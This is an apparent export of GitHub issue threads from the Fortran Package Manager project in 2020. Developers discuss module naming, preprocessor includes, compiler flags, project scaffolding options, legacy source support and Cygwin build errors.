                    "text": "Right, it's an important detail. :)\nI'm curious, did you read the Packaging Guide beforehand? If not, perhaps we need to link to it more prominently from the README. Currently it's at the bottom. If you did read it, was any part of the guide confusing?"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 15:11:10+00:00",
                    "text": "Yes, I read it. Let me rephrase, the problem was not with the same name, I already had my files and modules named the same. The problem is with the particular style: mod_name.f90 and module mod_name. It couldn't recognize modules starting with the prefix mod_."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-07 15:17:44+00:00",
                    "text": "Okay, I see. I don't think that should be the case. @everythingfunctional can you confirm this behavior? Is it expected?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:34:49+00:00",
                    "text": "We discussed the naming convention in #39 a bit.\nI think the above seems to be a bug either way, but in general, we were thinking that we could simply name the modules by a name, and then fpm would enforce the directory structure in the name. So if you are calling your module as mod_name, and put it into src/a/b/mod_name.f90, then fpm would enforce that the module is called a_b_mod_name, but the filename is just mod_name.f90. That way we are essentially allowing to have namespaces."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:36:38+00:00",
                    "text": "The other issue related to this is that all modules should probably be prefixed by the name of the package, again, enforced by fpm. That way when you depend on it in other dependencies, the modules do not clash. So src/mymod.f90 would start with module mypackage_mymod."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:41:29+00:00",
                    "text": "CCing @everythingfunctional, it's important that we get this right soon.\nI think the way we could do it is to implement what I described above by default and fpm would give an error if the modules are not named correctly. But users could override this in fpm.toml, if they really do not want to use this convention, say with module_naming_convention = false or something like that.\nFor example, in stdlib we already are naming modules like stdlib_experimental_io. After we move stdlib to use fpm, we would have a directory structure: src/experimental/io.f90, and since the package is called stdlib and since io.f90 is in the experimental directory, the file would start with module stdlib_experimental_io (as it already does). After the module graduates to stable, we move it to src/io.f90 and it would start with module stdlib_io."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-07 15:50:48+00:00",
                    "text": "The other issue related to this is that all modules should probably be prefixed by the name of the package, again, enforced by fpm. That way when you depend on it in other dependencies, the modules do not clash. So src/mymod.f90 would start with module mypackage_mymod.\n\nI agree that we need some solution to prevent name clash with dependencies, but this solution doesn't look like a good one to me. Consider datetime-fortran, which has the package name \"datetime\", and one module that contains a derived type datetime. How do you suggest I name the module?\nThe way it's named currently (datetime_module), this would require that I rename the module source file to src/module.f90. It works but it's very awkward to me."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-07 16:52:55+00:00",
                    "text": "If  mod_name as the name of a module was not working but m_name was, that's a bug. I'm not sure what the problem is offhand.\nI think enforcing modules in a library be prefixed by the project name is probably overkill. If namespacing is needed, we have a way to do that. Just put everything in a folder with the name of the library. I'm not sure having that be the default is necessary."
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 20:02:58+00:00",
                    "text": "I tried to replicate my issue with a smaller test case, and I couldn't, this time, fpm worked fine with modules with prefix mod_.  I also tried https://github.com/wavebitscientific/functional-fortran from  @milancurcic (since his modules are with mod_) and it also worked fine. I can only guess that I am missing something in my main project. I am going to look into it and will come back when I figure it out. Sorry for this false alarm. Regardless, your comments were very interesting and helpful. Thank you all!"
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 20:28:42+00:00",
                    "text": "@smeskos I am glad it works!\n@everythingfunctional I don't know. We should discuss it. I feel module names without prefixes should be reserved for the main (user) application. Libraries should hide their modules behind a prefix. That is the common convention in C, which has the same problem (all functions being global). So if we agree that is a good convention, then we should enforce it (users can opt-out)."
                }
            ]
        },
        {
            "number": 113,
            "user": "smeskos",
            "date": "2020-07-07 12:57:28+00:00",
            "title": "preprocessor directives",
            "text": "I am trying to build a simple logging library I wrote some time ago. In order to get file names and current line number I use a small preprocessor file: macros.h that only contains:\n#ifndef FL\n#define FL __FILE__\n#endif\n\n#ifndef LN\n#define LN __LINE__\n#endif\nand I include it at the beginning of the file I want to use it like #include \"macros.h\"\nI get this error when I am trying to build with fpm:\nExit code: 1\nStderr:\ntest/main.f90:1:2:\n\n    1 | #include \"marcos.h\"\n      |  1\nWarning: Illegal preprocessor directive\ntest/main.f90:8:20:\n\n    8 |     call log%info(FL, LN, 'Passed')\n      |                    1\nError: Symbol \u2018fl\u2019 at (1) has no IMPLICIT type\ncompilation terminated due to -fmax-errors=1.\nNote that this is with main.f90\nWhen I changed the name to main.F90and the fpm.toml file accordingly:\n[[test]]\nname=\"runTests\"\nsource-dir=\"test\"\nmain=\"main.F90\"\nThen I got this error:\nExit code: 1\nStderr:\ntest/main.F90:2:2:\n\n    2 | program test\n      |  1~~~~~~~~~\nFatal Error: marcos.h: No such file or directory\ncompilation terminated.\nAny suggestions of what I may be doing wrong?",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-07 14:08:37+00:00",
                    "text": "Is your include file macros.h or marcos.h? Currently your f90 file tries to include marcos.h but perhaps the file is called macros.h."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 14:30:27+00:00",
                    "text": "As discussed in #78, the .f90 files should also be run through the pre-processor, perhaps no by default (for speed reasons), but if you enable it in the fpm.toml."
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 15:06:36+00:00",
                    "text": "@milancurcic You are correct that was a typo, but the problem persists after correcting it."
                },
                {
                    "user": "LKedward",
                    "date": "2020-07-07 15:17:42+00:00",
                    "text": "Hi @smeskos, is the macros.h file in the same folder as the .f90 files that include it?"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 15:32:22+00:00",
                    "text": "@LKedward right, that was the problem. I had this in src/ but I wanted to use it in test/. Thank you!!"
                },
                {
                    "user": "LKedward",
                    "date": "2020-07-07 16:27:33+00:00",
                    "text": "Glad that fixed it!\nWe may potentially need an option to manually specify an include path or have a standard include folder (include/) which contains text inclusions; consider the case if you needed to use macros.h from both src/ and test/"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 19:46:06+00:00",
                    "text": "Thank you again. I am closing this."
                }
            ]
        },
        {
            "number": 112,
            "user": "smeskos",
            "date": "2020-07-07 12:39:16+00:00",
            "title": "Managing flags",
            "text": "Is it possible to add/remove flags and reset back to defaults if needed?\nIs there an option to display flags (before building)? (eg. fpm show flags)",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-07 14:31:37+00:00",
                    "text": "@smeskos what flags do you have in mind? Compiler flags?"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 14:58:42+00:00",
                    "text": "Yes I mean compiler flangs."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:10:20+00:00",
                    "text": "I don't think it's possible currently, but we need to have it.\nProbably fpm.toml should allow to set flags for specific compilers per file.\nHowever, even more important is to extract common flags into general settings that work across compilers.\nWhat flags would you like to set @smeskos ?"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 15:22:19+00:00",
                    "text": "I would like to set -cpp, -Wconversion and -std=f2018.  But most importantly to suppress warnings (per case), eg. many times when I am still testing something and is under-development I set -Wno-uninitialized-variables and others as well, the reason is that I don't want to pollute the output with dozens non-relevant warnings."
                },
                {
                    "user": "LKedward",
                    "date": "2020-07-07 15:28:07+00:00",
                    "text": "+1 for customising compile flags for debug/release.\nAlso need an option for specifying link flags for linking against external libs like BLAS etc."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:29:00+00:00",
                    "text": "Ok, so let's take it on a case by case:\n\n\n-cpp should be done in a general manner as discussed in #78.\n\n\n-std=f2018 should also be done in a general manner (that works with all compilers), probably an fpm.toml setting such as \"standard = F2018\" or something like that.\n\n\nThe -Wconversion should be enabled by default, together with all other common warnings\n\n\n-Wno-uninitialized-variables this is the one where we need to allow to set a specific option per file. It could also be done from a command line.\n\n\nSo we need a general solution, but the most common use cases (such as 1., 2. and 3. above) should be abstracted out and fpm should know how to deal with those."
                },
                {
                    "user": "jerryd",
                    "date": "2020-08-11 23:39:59+00:00",
                    "text": "I need to include things like this on the compiler command line.  Right now this is a blocker for me.  Is it possible to set FC to a script to wrap around this:\n$(pkgconf --cflags --libs gtk-3-fortran)\nAs an example:\ngfortran -c $(pkgconf --cflags --libs gtk-3-fortran) mystuff.f90\nBeing able to invoke pkgconf is also important for many other complex libraries."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-08-12 22:51:07+00:00",
                    "text": "Although it would be preferable for fpm to do this more generically, I ran into similar issues and you can specify something like\nbuild-script = \"fpm.mk\"\nand then put a Makefile in fpm.mk.  I had to use that to build a library that contained dozens of C files and where I wanted the output to include a *.a static library instead of *.o files and needed X11 to be loaded in the executables, for example. There are some environment variables defined by fpm(1) as described in the fpm documentation that are helpful in placing the output files in the correct directories, as they go in different places when you use the --release option; for example.  M_system and M_draw have fpm.mk files, for example\nhttps://github.com/urbanjost/M_system.git\nhttps://github.com/urbanjost/M_draw.git\nAlthough I apparently did not follow the toml standard in my fpm.toml files (although they work with fpm(1)) which I am hopefully going to correct soon. Maybe not the ideal long-term solution, but works today."
                },
                {
                    "user": "jerryd",
                    "date": "2020-08-14 16:53:20+00:00",
                    "text": "It seems the simplest way to do this would to have FPM check for an environment variable such as $FFLAGS and just substitute those in or use it to override the default flags.  I have not looked at the FPM source code so I 'imagine' this would be straight forward to do"
                }
            ]
        },
        {
            "number": 111,
            "user": "certik",
            "date": "2020-07-06 20:09:15+00:00",
            "title": "Introduce --lib to initalize a project with a library",
            "text": "Currently this is the default, but there should be an option for the default value also (in addition I propose that this should not be the default in #109).",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-06 21:22:27+00:00",
                    "text": "I would combine this, #109, and #110 into a single issue, as these are all related.\nFor renaming the command line flags, I'm open to that. I tend to lean towards the more verbose to help make things more \"self documenting\", but understand that's not always the most popular way for everything.\nIn general, there are 3 (partially) independent pieces that fpm might create for a new project: src/project.f90, app/main.f90, and test/main.f90. Let's say the command line flags for each are --app, --lib, and --test.\nIf I understand correctly, you're suggesting that the default should be fpm new --app --lib name.\nIn order to not include an app, you'd then want a --no-app flag. So, should we have both flags, or just the ones for the opposite of the default? Having both would imply a total of 6 flags, each of which is mutually exclusive with the other; --app or --no-app, --lib or --no-lib, and --test or --no-test. But, we only really need the flags --no-app, --no-lib, and --test. And then a user can't actually specify contradictory flags, because there aren't any.\nExcept for one question. Should we allow fpm new --no-lib --test name? It doesn't actually break anything, but is kind of strange, because at that point what are you going to be testing?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-06 22:16:39+00:00",
                    "text": "Good point. In Cargo, the --lib and --bin (as Cargo calls it) are mutually exclusive, so specifying --lib means no --bin.\nGiven the slight differences in Fortran and Rust and how modules are called, we can change this and figure out what makes sense for Fortran.\nBut the naming and default I think can be the same. \"fpm new\" would create the default app / executable. In addition, it can still create a library. Perhaps we'll always create a library, so perhaps --lib will always be on.\nAs long as:\nfpm new x\ncd x\nfpm run\n\nworks and executes the executable, then I am fine. The above I feel will be a very common workflow to test something out, whether to test out some library, or some Fortran construct, or some quick idea.\nI think you start a new Fortran library much less often. Sort of like writing a Python script vs starting a new Python library that you upload on pypi. I do the script much more often.\nLet's get an agreement on that first. Since you agree with the renaming of the options, those are the two main things I care about. We can discuss how exactly the --lib works later as we gain more experience with fpm."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 14:02:50+00:00",
                    "text": "I would prefer the default create all three, as they do not hurt anything and that you have one switch \"-with\" that can take the names app,test,lib that when specified only creates those elments, so the default would be\nfpm new -MYNAME  -with app,lib,test\nbut that if you just wanted the src/ directory as is the current default you would enter\nfpm new MYNAME -with lib\nor that there are three switches --lib --app and --test and if any of them is specified only specified ones are generated. So the default could be whatever but as soon as you said --lib the others would only be created if listed, so\nfpm new MYNAME # does whatever everyone wants to be the default\nfpm new MYNAME -lib  # only builds src/\nfpm new MYNAME -lib -app -test # builds all three\nI think the second is the most like other package managers.  I was thinking maybe there should just be a switch that takes a name, and there could be a name for each of the examples on the web page so you could enter something like\nfpm new MYNAME  project_with_library\nas  \"new\" (at least currently) only allows one directory name so a second name could be a \"type\". So something like\nfpm new  MYNAME lib test src  \nis another way to go\nI would have to reactivate short/long names in M_CLI2 or use another parser (but adding it back is trivial) but if\nyou went with the --lib --app --test you could have short names so\nfpm new MYNAME -lat\nMy personal favorite is\nfpm new  MYNAME # creates all three\nfpm  new MYNAME --lib --app # creates just src/ and app/\nand no shorter names. I tend to like descriptive names as well so when you find a command in a script it is self-descriptive. A private library I have allows short names by popular demand but only if you have a tty so you have to use long names in a batch job (which I have had more than one argument about :>)."
                }
            ]
        },
        {
            "number": 110,
            "user": "certik",
            "date": "2020-07-06 20:07:33+00:00",
            "title": "Rename --with-executable to --bin (or --app)",
            "text": "So that it is easier to type. Although in #109 I argue it should be the default.",
            "comments": []
        },
        {
            "number": 109,
            "user": "certik",
            "date": "2020-07-06 20:05:55+00:00",
            "title": "fpm new should do --with-executable by default",
            "text": "That is what Cargo does and what I also find intuitive. Very common when I want to just try something out in Fortran.",
            "comments": []
        },
        {
            "number": 108,
            "user": "milancurcic",
            "date": "2020-06-24 16:15:59+00:00",
            "title": "rename reference to other fpm",
            "text": "Minor change to the README to not use the word \"effing\" when referring to the other fpm.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-06-24 16:26:59+00:00",
                    "text": "Merging as previously agreed on by @certik and @everythingfunctional ."
                },
                {
                    "user": "certik",
                    "date": "2020-06-24 16:28:03+00:00",
                    "text": "+1, thank you @milancurcic !"
                }
            ]
        },
        {
            "number": 107,
            "user": "ivan-pi",
            "date": "2020-06-21 15:21:22+00:00",
            "title": "Projects including legacy files",
            "text": "I've been trying to get fpm to work with some old-school packages like MINPACK: https://github.com/certik/minpack. These projects are generally just a bunch of fixed format \".f\" files. For modern applications that rely on such legacy codes, an interface module is the first step towards safe function calls.\nTrying to run fpm build on @certik's MINPACK fails with errors akin to:\nfpm build --release\n# gfortran (for build/gfortran_release/minpack/rwupdt.o build/gfortran_release/minpack/rwupdt.mod)\n# gfortran (for build/gfortran_release/minpack/dmchar.o build/gfortran_release/minpack/dmchar.mod)\n# gfortran (for build/gfortran_release/minpack/lmpar.o build/gfortran_release/minpack/lmpar.mod)\n# gfortran (for build/gfortran_release/minpack/hybrd.o build/gfortran_release/minpack/hybrd.mod)\nfpm: Error when running Shake build system:\n  at want, called at src/Build.hs:205:11 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n* Depends on: build/gfortran_release/minpack/libminpack.a\n  at need, called at src/Build.hs:203:13 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n* Depends on: build/gfortran_release/minpack/rwupdt.o\n  at &%>, called at src/Build.hs:183:11 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n* Depends on: build/gfortran_release/minpack/rwupdt.o build/gfortran_release/minpack/rwupdt.mod\n  at error, called at src/Development/Shake/Internal/Rules/Files.hs:245:13 in shake-0.18.5-44KSA7uQF2VObxzEvLYZx:Development.Shake.Internal.Rules.Files\n* Raised the exception:\nError, &%> rule failed to produce 1 file (out of 2)\n  build/gfortran_release/minpack/rwupdt.o\n  build/gfortran_release/minpack/rwupdt.mod - MISSING\n\nI understand that fpm is expecting to find a module file for each single \".f\" file. Is it possible to somehow work around this? The farthest I could get it in the fpm source was to remove to the \"-Wimplicit-interface\" flag which was creating lots of warnings \ud83d\ude48 .\nAm I right to think fpm is currently most suitable for projects composed of multiple module files?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-06-22 07:55:04+00:00",
                    "text": "I was playing around with gtk-fortran and I found a work-around for non-module sources by renaming them to .in files so that fpm ignored them and including them with the include statement in a module.\nIt's not ideal and I'm not sure what the plan is for supporting non-module sources but I think they should be supported in some form.\nPerhaps the larger question is whether we will make fpm flexible enough to support legacy packages in their original form or require restructuring of such packages; this latter option is not as extreme as it sounds since for some packages, fpm support will be brought through a third-party fork anyway (i.e. not via the upstream repo)."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-22 21:47:46+00:00",
                    "text": "At the moment, fpm is only really targeted at projects with modules. At some point we may support non-module sources, but it may be some time before we get to it.\n@LKedward , clever workaround. I may even suggest that as a recommended migration path.\nIn the mean time, there is always the out that fpm now supports custom build scripts or Makefiles (with some specific requirements)."
                },
                {
                    "user": "certik",
                    "date": "2020-06-22 22:17:28+00:00",
                    "text": "We have to support non-module sources. But this might be a feature to put into the Fortran based fpm to keep the Haskell based on minimal to be used in bootstrapping."
                }
            ]
        },
        {
            "number": 106,
            "user": "arjenmarkus",
            "date": "2020-06-21 12:28:18+00:00",
            "title": "Error message on Cygwin - \"pwd -W\"",
            "text": "I have tried to build fpm on Windows/Cygwin and got an error message. The output to screen was:\n$ stack build\nPreparing to install GHC to an isolated location.\nThis will not interfere with any system-level installation.\nDownloaded ghc-8.6.5.\nAlready downloaded.\nAlready downloaded.\nDecompressing ghc-8.6.5.tar.xz...\n7-Zip 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18\nProcessing archive: C:\\Users\\markus\\AppData\\Local\\Programs\\stack\\x86_64-windows\\ghc-8.6.5.tar.xz\nExtracting  ghc-8.6.5.tar\nEverything is Ok\nSize:       1773445120\nCompressed: 280280296\nExtracting ghc-8.6.5.tar...\nExtracted total of 9780 files from ghc-8.6.5.tar\nGHC installed to C:\\Users\\markus\\AppData\\Local\\Programs\\stack\\x86_64-windows\\ghc-8.6.5\nCloning 536a5e6ffb148d0dd4e4c4b120913a6744097676 from https://github.com/kowainik/tomland.git\nReceived ExitFailure 1 when running\nRaw command: \"C:\\cygwin\\bin\\git.EXE\" submodule update --init --recursive\nRun from: C:\\cygwin\\tmp\\with-repo1848\\cloned\nStandard error:\n/usr/libexec/git-core/git-sh-setup: line 344: pwd: -W: invalid option\npwd: usage: pwd [-LP]\nUnable to determine absolute path of git directory\nApparently, an option -W to the \"pwd\" command is being used that does not exist in the Cygwin version of \"pwd\".\nHow to proceed?",
            "comments": [
                {
                    "user": "arjenmarkus",
                    "date": "2020-06-21 12:36:06+00:00",
                    "text": "The Linux version requires that I install parts of \"stack\" in /usr/local/bin. Unfortunately, I do not have root/sudo access to the Linux systems I can log on to, so that makes it difficult for me to test fpm on Linux."
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-22 07:57:57+00:00",
                    "text": "Hi @arjenmarkus, if you don't have root access on linux, please follow the manual installation procedure for stack."
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-22 08:28:32+00:00",
                    "text": "The cygwin error appears to be a fundamental incompatibility between stack and the cygwin environment (at least for this command) - I've been able to run stack build successfully on Windows via command prompt after installing git for windows. I haven't verified stack test in command prompt because I use gfortran via msys2.\nI don't see any reason why fpm built in this manner won't subsequently work from within cygwin.\nAside: interestingly, stack appears to install the msys2 environment on windows when stack build is run. msys2 is a newer fork of cygwin which I switched to (from cygwin) a year ago - I find I have much fewer compatibility problems with msys2."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-06-22 09:26:05+00:00",
                    "text": "Hi Laurence,\n\nthanks for that reference. I hoped this morning that I might be able to use\na VM for Linux, but that fails - sigh. Oh well, the instructions should\nhelp me solve that via the regular machine.\n\nRegards,\n\nArjen\n\nOp ma 22 jun. 2020 om 09:58 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n Hi @arjenmarkus <https://github.com/arjenmarkus>, if you don't have root\n access on linux, please follow the manual installation procedure\n <https://docs.haskellstack.org/en/stable/install_and_upgrade/#manual-download_2>\n for stack.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#106 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR7ROV7PMBUWOC2VIWDRX4FJHANCNFSM4OD2ZINA>\n ."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-06-22 09:28:31+00:00",
                    "text": "Hi Laurence,\n\none reason for sticking to Cygwin for me is the better (?) support for\ninstalling packages. I have MinGW-w64/MSYS2 installed as well, perhaps\nI should indeed try it that way too.\n\nRegards,\n\nArjen\n\nOp ma 22 jun. 2020 om 10:28 schreef Laurence Kedward <notifications@github.com>:\n\u2026\n\n The cygwin error appears to be a fundamental incompatibility between stack and the cygwin environment (at least for this command) - I've been able to run stack build successfully on Windows via command prompt after installing git for windows. I haven't verified stack test in command prompt because I use gfortran via msys2.\n I don't see any reason why fpm built in this manner won't subsequently work from within cygwin.\n\n Aside: interestingly, stack appears to install the msys2 environment on windows when stack build is run. msys2 is a newer fork of cygwin which I switched to (from cygwin) a year ago - I find I have much fewer compatibility problems with msys2.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub, or unsubscribe."
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-22 09:57:24+00:00",
                    "text": "Hi Arjen,\n\none reason for sticking to Cygwin for me is the better (?) support for installing packages.\n\nThis is a fair point - it would be good to support running fpm on Cygwin, even if that means building fpm outside of Cygwin as I demonstrated.\nLaurence"
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-06-22 14:20:15+00:00",
                    "text": "Hi Laurence,\n\njust tried this, but now the \"stack build\" command produces the following\noutput;\n stack build\nNo setup information found for ghc-8.6.5 on your platform.\nThis probably means a GHC bindist has not yet been added for OS key\n'linux64-gmp4'.\nSupported versions: ghc-7.8.4, ghc-7.10.2, ghc-7.10.3, ghc-8.0.1,\nghc-8.0.2, ghc-8.2.1, ghc-8.2.2, ghc-8.4.2\n\nI am not sure this is relevant, but the OS is fairly old - CentOS 6, if I\nam not mistaken.\n\nRegards,\n\nArjen\n\nOp ma 22 jun. 2020 om 09:58 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n Hi @arjenmarkus <https://github.com/arjenmarkus>, if you don't have root\n access on linux, please follow the manual installation procedure\n <https://docs.haskellstack.org/en/stable/install_and_upgrade/#manual-download_2>\n for stack.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#106 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR7ROV7PMBUWOC2VIWDRX4FJHANCNFSM4OD2ZINA>\n ."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-06-22 17:29:55+00:00",
                    "text": "Well, the good news is that after installing the version of stack and git\nfor \"plain Windows\", building fpm went smoothly and I could build a simple\n(one-source-file) program. (Some juggling required: I have gfortran\ninstalled for Cygwin and MinGW-w64/MSYS2, not for \"plain Windows\", but from\na Cygwin command window, it works fine)\n\nRegards,\n\nArjen\n\n\n\n\nOp ma 22 jun. 2020 om 16:20 schreef Arjen Markus <arjen.markus895@gmail.com\n\u2026\n:\n Hi Laurence,\n\n just tried this, but now the \"stack build\" command produces the following\n output;\n\n > stack build\n No setup information found for ghc-8.6.5 on your platform.\n This probably means a GHC bindist has not yet been added for OS key\n 'linux64-gmp4'.\n Supported versions: ghc-7.8.4, ghc-7.10.2, ghc-7.10.3, ghc-8.0.1,\n ghc-8.0.2, ghc-8.2.1, ghc-8.2.2, ghc-8.4.2\n\n I am not sure this is relevant, but the OS is fairly old - CentOS 6, if I\n am not mistaken.\n\n Regards,\n\n Arjen\n\n Op ma 22 jun. 2020 om 09:58 schreef Laurence Kedward <\n ***@***.***>:\n\n> Hi @arjenmarkus <https://github.com/arjenmarkus>, if you don't have root\n> access on linux, please follow the manual installation procedure\n> <https://docs.haskellstack.org/en/stable/install_and_upgrade/#manual-download_2>\n> for stack.\n>\n> \u2014\n> You are receiving this because you were mentioned.\n> Reply to this email directly, view it on GitHub\n> <#106 (comment)>,\n> or unsubscribe\n> <https://github.com/notifications/unsubscribe-auth/AAN6YR7ROV7PMBUWOC2VIWDRX4FJHANCNFSM4OD2ZINA>\n> .\n>"
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-22 18:15:29+00:00",
                    "text": "Hi Arjen,\nUnfortunately I won't be much help with the CentOS error but I'm glad you were able to get it working on Windows also.\nAre you able to run stack test in the fpm root folder under Cygwin? I was encountering an error with the makefile test case when I did this under msys2.\nLaurence\nFor future users: it seems stack build is incompatible with the Cygwin environment, but fpm can still be used in Cygwin if built in \"Plain Windows\" as done by myself and Arjen."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-06-22 18:56:58+00:00",
                    "text": "Hi Laurence,\n\nI just ran \"stack test\" and I get errors as well:\n\ngfortran -c -J/fortran/fpm/fpm/test/example_packages/with_makefile/build/gfortran_debug/with_makefile\n -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g\n-fbounds-check -fcheck-array-temporaries -fbacktrace -o\n/fortran/fpm/fpm/test/example_packages/with_makefile/build/gfortran_debug/with_makefile/hello_makefile.o\nsrc/hello_makefile.f90\nf951: Warning: Nonexistent include directory\n\u2018/fortran/fpm/fpm/test/example_packages/with_makefile/build/gfortran_debug/with_makefile\u2019\n[-Wmissing-include-dirs]\nsrc/hello_makefile.f90:10:25:\n\n   10 | end module hello_makefile\n      |                         1\nFatal Error: Cannot open module file\n\u2018/fortran/fpm/fpm/test/example_packages/with_makefile/build/gfortran_debug/with_makefile/hello_makefile.mod0\u2019\nfor writing at (1): No such file or directory\ncompilation terminated.\n\nSo, indeed the same case is failing here as well.\n\nRegards,\n\nArjen\n\nOp ma 22 jun. 2020 om 20:15 schreef Laurence Kedward <notifications@github.com>:\n\u2026\n\n Hi Arjen,\n Unfortunately I won't be much help with the CentOS error but I'm glad you were able to get it working on Windows also.\n Are you able to run stack test in the fpm root folder under Cygwin? I was encountering an error with the makefile test case when I did this under msys2.\n\n Laurence\n\n For future users: it seems stack build is incompatible with the Cygwin environment, but fpm can still be used in Cygwin if built in \"Plain Windows\" as done by myself and Arjen.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub, or unsubscribe."
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-23 08:32:38+00:00",
                    "text": "Hi Arjen,\nThanks for confirming - I wasn't sure if something was wrong with my msys2 setup.\nNot sure what the problem is, but it looks like it only affects the makefile builds.\nRegards,\nLaurence"
                }
            ]
        },
        {
            "number": 105,
            "user": "ivan-pi",
            "date": "2020-06-21 09:20:09+00:00",
            "title": "Projects with multiple drivers",
            "text": "Following the discussion at the monthly call, I've installed fpm and am trying to convert a few of my Fortran projects to the recommended structure. These projects involve some legacy fixed-style functions and subroutines, an interface module, and several driver programs (tests). The folder structure is something like:\n.\n\u251c\u2500\u2500 drivers\n\u2502   \u251c\u2500\u2500 driver1.f90\n|   \u2514\u2500\u2500 driver2.f90\n\u251c\u2500\u2500 src\n\u2502   \u251c\u2500\u2500 legacy\n|   |   \u251c\u2500\u2500 legacy1.f\n|   |   \u2514\u2500\u2500 legacy2.f\n|   \u2514\u2500\u2500 interface.f90\n\u2514\u2500\u2500 fpm.toml\n\nDo I need to add multiple sections such as\n[[driver]]\nname = \"driver1\"\nsource-dir = \"drivers\"\nmain = \"driver1.f90\"\n\nto the TOML file? Right now my build just crashes because of multiple executable files.\nI think having multiple executable programs is a quite common type of package, say you have a library for building mesh triangulations, and then with it a small set of command line tools calling routines from this common library.\nAnother question is can I already specify dependencies on system-wide installed libraries. Say a project (or one of it's dependencies) needs to be linked with -llapack -lblas (with the actual LAPACK and BLAS libraries potentially in some non-default location). Does this fit under issue #99 of custom build scripts?\nI had a few other comments about the installation process, but they were already fixed in #101. A remaining point might be that after doing stack install in the fpm folder, the ${HOME}/.local/bin/ folder might not be on the path already, requiring an extra command export PATH=\"$PATH:$HOME/.local/bin/\".",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2020-06-21 13:50:08+00:00",
                    "text": "Here is the project I am trying to convert to be fpm-usable: https://github.com/ivan-pi/fortran_lsp/tree/fpm"
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-22 07:34:25+00:00",
                    "text": "Hi @ivan-pi, regarding multiple drivers I believe the current fpm behaviour allows only one executable source file per folder, where any other Fortran files in that same folder are assumed to be modules; this is undocumented I think because the behaviour is still under discussion, see #91 - the suggestion there by @certik seems promising.\n\nA remaining point might be that after doing stack install in the fpm folder, the ${HOME}/.local/bin/ folder might not be on the path already, requiring an extra command export PATH=\"$PATH:$HOME/.local/bin/\".\n\nThis is a good point and should probably be added to the README."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-06-22 09:27:29+00:00",
                    "text": "Thanks @LKedward  for pointing me to the previous discussion. It seems that this issue is then a duplicate. @everythingfunctional and @certik, should I close this issue and comment in #91 instead?\n\nThis is a good point and should probably be added to the README.\n\nI will create a pull request in the next day or two."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-22 22:06:03+00:00",
                    "text": "Hi @ivan-pi , thanks for trying out fpm with your project. You can have more than one executable per project, but as @LKedward pointed out you must have them in separate folders. Not that the entry in the toml file starts as [[executable]] instead of [[driver]], or it seemed like you considered these to be test programs, so you may want to specify them with [[test]].\nAs for the compiler flags, we haven't really gotten a good handle on how to deal with those. The problem mostly comes from what to do with them in terms of dependencies. Does a project's dependencies get compiled with the flags it specified? What about projects that depend on it? What about if you switch compilers? It's on our radar, it's just a really hard problem that we haven't tackled yet.\nYou can close this issue if you feel the other adequately covers it. Also, feel free to open up other issues if you want make sure we keep track of anything else you asked here."
                },
                {
                    "user": "certik",
                    "date": "2020-06-22 22:20:36+00:00",
                    "text": "I believe Cargo supports to have multiple main programs in the bin directory. I think we agreed to use an app directory instead of bin. Is there a reason why fpm cannot compile those automatically?\nIt is intuitive and natural. I would expect it to work also."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-22 22:35:36+00:00",
                    "text": "It's not that we can't support it, it just makes things more complicated than \"everything else in this folder is a module that should be compiled and linked in\".\nWe (sort of) support having multiple programs in the app directory, they just have to be in separate sub-folders and have explicit entries in fpm.toml."
                },
                {
